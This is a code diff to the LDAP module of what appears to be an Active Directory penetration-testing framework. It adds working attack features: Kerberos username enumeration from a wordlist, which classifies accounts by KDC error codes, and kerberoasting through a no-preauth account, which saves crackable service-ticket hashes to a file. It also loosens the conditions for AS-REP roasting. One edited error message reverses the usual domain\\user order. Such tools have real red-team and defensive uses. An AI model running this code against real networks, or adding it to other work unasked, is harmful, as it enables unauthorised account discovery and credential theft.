@@ -3,6 +3,7 @@
 import hashlib
 import hmac
 import os
+import socket
 from errno import EHOSTUNREACH, ETIMEDOUT, ENETUNREACH
 from binascii import hexlify
 from datetime import datetime
@@ -10,6 +11,7 @@ from re import sub, IGNORECASE
 from zipfile import ZipFile
 from termcolor import colored
 from dns import resolver
+from collections import defaultdict
 
 from Cryptodome.Hash import MD4
 from OpenSSL.SSL import SysCallError
@@ -24,7 +26,7 @@ from impacket.dcerpc.v5.samr import (
     SAM_MACHINE_ACCOUNT,
 )
 from impacket.krb5 import constants
-from impacket.krb5.kerberosv5 import getKerberosTGS, SessionKeyDecryptionError
+from impacket.krb5.kerberosv5 import getKerberosTGS, SessionKeyDecryptionError, KerberosError, getKerberosTGT
 from impacket.krb5.ccache import CCache
 from impacket.krb5.types import Principal, KerberosException
 from impacket.ldap import ldap as ldap_impacket
@@ -364,7 +366,7 @@ class ldap(connection):
         if nthash:
             self.nthash = nthash
 
-        if self.username and self.password == "" and self.args.asreproast:
+        if self.password == "" and self.args.asreproast:
             hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
             if hash_tgt:
                 self.logger.highlight(f"{hash_tgt}")
@@ -483,7 +485,7 @@ class ldap(connection):
         self.password = password
         self.domain = domain
 
-        if self.username and self.password == "" and self.args.asreproast:
+        if self.password == "" and self.args.asreproast:
             hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
             if hash_tgt:
                 self.logger.highlight(f"{hash_tgt}")
@@ -574,7 +576,7 @@ class ldap(connection):
         self.username = username
         self.domain = domain
 
-        if self.username and self.hash == "" and self.args.asreproast:
+        if self.hash == "" and self.args.asreproast:
             hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
             if hash_tgt:
                 self.logger.highlight(f"{hash_tgt}")
@@ -965,6 +967,9 @@ class ldap(connection):
                 self.logger.highlight(f"{user.get('sAMAccountName', ''):<30}{pwd_last_set:<20}{user.get('badPwdCount', ''):<9}{user.get('description', '')}")
 
     def asreproast(self):
+        if self.password == "" and self.nthash == "" and not self.kerberos:
+            return False
+
         # Building the search filter
         search_filter = f"(&(UserAccountControl:1.2.840.113556.1.4.803:={UF_DONT_REQUIRE_PREAUTH})(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE}))(!(objectCategory=computer)))"
         resp = self.search(search_filter, attributes=["sAMAccountName"], sizeLimit=0)
@@ -981,6 +986,54 @@ class ldap(connection):
                         hash_asreproast.write(f"{hash_TGT}\n")
 
     def kerberoasting(self):
+        if self.args.no_preauth_user:
+            if not self.args.username:
+                self.logger.fail("Use -u/--username to supply a list of usernames or SPNs (file or comma-separated list)")
+                return
+
+            usernames = []
+            for item in self.args.username:
+                if os.path.isfile(item):
+                    with open(item, encoding="utf-8") as f:
+                        usernames.extend(l.strip() for l in f if l.strip())
+                else:
+                    usernames.append(item.strip())
+
+            skipped = []
+            hashes  = []
+
+            for spn in usernames:
+                base_name = spn.split("/", 1)[0].split("@", 1)[0].rstrip()
+
+                if base_name.lower() == "krbtgt" or base_name.endswith("$"):
+                    skipped.append(base_name)
+                    continue
+
+                hashline = KerberosAttacks(self).get_tgs_no_preauth(
+                    self.args.no_preauth_user,
+                    spn
+                )
+                if hashline:
+                    hashes.append(hashline)
+
+            if skipped:
+                self.logger.display(f"Skipping account: {', '.join(skipped)}")
+
+            if hashes:
+                self.logger.display(f"Total of records returned {len(hashes)}")
+            else:
+                self.logger.highlight("No entries found!")
+
+            for line in hashes:
+                self.logger.highlight(line)
+                if self.args.kerberoasting:
+                    with open(self.args.kerberoasting, "a+", encoding="utf-8") as f:
+                        f.write(line + "\n")
+
+            return
+
+
+
         # Building the search filter
         searchFilter = "(&(servicePrincipalName=*)(!(objectCategory=computer)))"
         attributes = [
@@ -1047,7 +1100,138 @@ class ldap(connection):
                         self.logger.debug(f"Exception: {e}", exc_info=True)
                         self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
                 else:
-                    self.logger.fail(f"Error retrieving TGT for {self.domain}\\{self.username} from {self.kdcHost}")
+                    self.logger.fail(f"Error retrieving TGT for {self.username}\\{self.domain} from {self.kdcHost}")
+
+    def userenum(self):
+        files = self.args.userenum
+        if not files or len(files) == 0:
+            self.logger.fail("No user file provided")
+            return
+
+        users_file = files[0]
+        output_file_base = files[1] if len(files) > 1 else None
+
+        if not os.path.exists(users_file):
+            self.logger.fail(f"User file '{users_file}' not found")
+            return
+
+        with open(users_file, "r") as file:
+            usernames = list(dict.fromkeys(line.strip() for line in file if line.strip()))
+
+        kdc = self.kdcHost or self.domain or "Unknown"
+        try:
+            socket.gethostbyname(kdc)
+        except Exception as e:
+            self.logger.fail(f"Could not resolve or reach the KDC '{kdc}': {e}")
+            return
+
+        grouped_results = defaultdict(list)
+        found_users_by_host = defaultdict(list)
+
+        for username in usernames:
+            try:
+                principal = Principal(username, type=1)
+                getKerberosTGT(
+                    principal,
+                    password="",
+                    nthash=None,
+                    lmhash=None,
+                    domain=self.domain,
+                    kdcHost=self.kdcHost,
+                )
+
+            except SessionKeyDecryptionError:
+                msg = f"{username}: AS-REP roastable"
+                grouped_results[(self.host, self.port, self.hostname, self.domain)].append(("success", msg, "asrep"))
+                key = (self.host, self.port, self.hostname, self.domain)
+                if username not in found_users_by_host[key]:
+                    found_users_by_host[key].append(username)
+
+            except KerberosError as e:
+                error_str = str(e)
+
+                if "KDC_ERR_PREAUTH_REQUIRED" in error_str or "KDC_ERR_PREAUTH_FAILED" in error_str:
+                    msg = f"{username}: Valid Account"
+                    grouped_results[(self.host, self.port, self.hostname, self.domain)].append(
+                        ("success", msg)
+                    )
+                    key = (self.host, self.port, self.hostname, self.domain)
+                    if username not in found_users_by_host[key]:
+                        found_users_by_host[key].append(username)
+
+                elif "KDC_ERR_ETYPE_NOTSUPP" in error_str:
+                    msg = f"{username}: Valid Account (etype not supported)"
+                    grouped_results[(self.host, self.port, self.hostname, self.domain)].append(
+                        ("success", msg)
+                    )
+                    key = (self.host, self.port, self.hostname, self.domain)
+                    if username not in found_users_by_host[key]:
+                         found_users_by_host[key].append(username)
+
+                else:
+                    REV_MAP = {
+                        "KDC_ERR_CLIENT_REVOKED":  "Account exists but is revoked/disabled",
+                        "KDC_ERR_SERVICE_REVOKED": "Service account revoked/disabled",
+                    }
+
+                    handled = False
+                    for code, message in REV_MAP.items():
+                        if code in error_str:
+                            msg = f"{username}: {message}"
+                            grouped_results[(self.host, self.port, self.hostname, self.domain)].append(
+                                ("fail", msg, "magenta")
+                            )
+                            key = (self.host, self.port, self.hostname, self.domain)
+                            if username not in found_users_by_host[key]:
+                                found_users_by_host[key].append(username)
+
+                            handled = True
+                            break
+
+                    if not handled:
+                        if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in error_str:
+                            if self.args.debug:
+                                self.logger.debug(f"{username}: Not found in Kerberos database "
+                                                "(KDC_ERR_C_PRINCIPAL_UNKNOWN)")
+                            continue
+
+                        msg = f"{username}: Unexpected Kerberos error"
+                        grouped_results[(self.host, self.port, self.hostname, self.domain)].append(
+                            ("fail", msg, "red")
+                        )
+                        if self.args.debug:
+                            self.logger.debug(f"{username}: {error_str}", exc_info=True)
+
+        for (host, port, hostname, domain), results in grouped_results.items():
+            for entry in results:
+                if entry[0] == "success":
+                    if len(entry) == 3 and entry[2] == "asrep":
+                        asrep_msg = entry[1].replace(
+                            "AS-REP roastable",
+                            colored("AS-REP roastable", "yellow", attrs=["bold"])
+                        )
+                        self.logger.success(asrep_msg, host=host, port=port, hostname=hostname)
+                    else:
+                        self.logger.success(entry[1], host=host, port=port, hostname=hostname)
+                elif entry[0] == "fail":
+                    self.logger.fail(entry[1], host=host, port=port, hostname=hostname, color=entry[2])
+
+            if output_file_base and found_users_by_host[(host, port, hostname, domain)]:
+                output_file = output_file_base
+
+                try:
+                    with open(output_file, "a+", encoding="utf-8") as f:
+                        for user in found_users_by_host[(host, port, hostname, domain)]:   # liste déjà en ordre
+                            f.write(user + "\n")
+
+                    self.logger.display(
+                        f"Saved {len(found_users_by_host[(host, port, hostname, domain)])} "
+                        f"valid usernames to {output_file}"
+                    )
+
+                except Exception as e:
+                    self.logger.fail(f"Failed to write valid usernames to {output_file}: {e}")
+
 
     def query(self):
         """
@@ -1114,7 +1298,8 @@ class ldap(connection):
                          f"(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE})))")
         # f"(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_SERVER_TRUST_ACCOUNT})))")  This would filter out RBCD to DCs
 
-        attributes = ["sAMAccountName", "pwdLastSet", "userAccountControl", "objectCategory", "msDS-AllowedToActOnBehalfOfOtherIdentity", "msDS-AllowedToDelegateTo"]
+        attributes = ["sAMAccountName", "pwdLastSet", "userAccountControl", "objectCategory",
+                      "msDS-AllowedToActOnBehalfOfOtherIdentity", "msDS-AllowedToDelegateTo"]
 
         resp = self.search(search_filter, attributes)
         answers = []
@@ -1434,3 +1619,4 @@ class ldap(connection):
                 if each_file.startswith(self.output_filename.split("/")[-1]) and each_file.endswith("json"):
                     z.write(each_file)
                     os.remove(each_file)
+
